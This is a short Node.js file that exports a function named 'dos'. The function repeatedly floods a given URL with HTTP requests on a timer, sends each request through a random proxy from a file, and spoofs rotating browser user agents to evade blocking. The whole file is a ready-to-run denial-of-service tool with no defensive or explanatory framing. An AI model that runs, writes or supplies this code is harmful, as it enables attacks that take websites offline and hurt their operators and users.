const request = require('request');
const fs = require('fs');

// Read proxies from proxies.txt
const proxies = fs.readFileSync(__dirname+'/proxies.txt', 'utf-8').split('\n').filter(line => line.trim() !== '');

// List of user agents
const userAgents = [
    'Mozilla/5.0 (X11; U; Linux x86_64; en-US; rv:1.9.1.3) Gecko/20090913 Firefox/3.5.3',
    'Mozilla/5.0 (Windows; U; Windows NT 6.1; en; rv:1.9.1.3) Gecko/20090824 Firefox/3.5.3 (.NET CLR 3.5.30729)',
    'Mozilla/5.0 (Windows; U; Windows NT 5.2; en-US; rv:1.9.1.3) Gecko/20090824 Firefox/3.5.3 (.NET CLR 3.5.30729)',
    'Mozilla/5.0 (Windows; U; Windows NT 6.1; en-US; rv:1.9.1.1) Gecko/20090718 Firefox/3.5.1',
    'Mozilla/5.0 (Windows; U; Windows NT 5.1; en-US) AppleWebKit/532.1 (KHTML, like Gecko) Chrome/4.0.219.6 Safari/532.1',
    'Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 6.1; WOW64; Trident/4.0; SLCC2; .NET CLR 2.0.50727; InfoPath.2)',
    'Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 6.0; Trident/4.0; SLCC1; .NET CLR 2.0.50727; .NET CLR 1.1.4322; .NET CLR 3.5.30729; .NET CLR 3.0.30729)',
    'Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 5.2; Win64; x64; Trident/4.0)',
    'Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 5.1; Trident/4.0; SV1; .NET CLR 2.0.50727; InfoPath.2)',
    'Mozilla/5.0 (Windows; U; MSIE 7.0; Windows NT 6.0; en-US)',
    'Mozilla/4.0 (compatible; MSIE 6.1; Windows XP)',
    'Opera/9.80 (Windows NT 5.2; U; ru) Presto/2.5.22 Version/10.51'
];

// Function to get a random element from an array
const getRandomElement = (array) => array[Math.floor(Math.random() * array.length)];

const dos = (url, qty, ms) => {
    let err = 0, ok = 0;
    let counter = 1;
    let statusCodes = {};

    setInterval(() => {
        for (let i = 0; i < qty; i++) {
            const proxy = getRandomElement(proxies);
            const userAgent = getRandomElement(userAgents);
            const options = {
                url: url,
                proxy: 'http://' + proxy,
                headers: {
                    'User-Agent': userAgent
                }
            };

            request(options, (error, response) => {
                if (error) {
                    err++;
                } else {
                    ok++;
                    const statusCode = response.statusCode;
                    
                    if (statusCodes[statusCode]) {
                        statusCodes[statusCode]++;
                    } else {
                        statusCodes[statusCode] = 1;
                    }
                }
            });
        }

        const statusCodesString = Object.entries(statusCodes)
            .map(([code, count]) => `${code}: ${count}`)
            .join(', ');

        console.log(`${counter}: ${url} ${ok} ${err} Status Codes: ${statusCodesString}`);
        
        counter++;
        err = ok = 0;
        statusCodes = {};
    }, ms);
};

module.exports = dos;
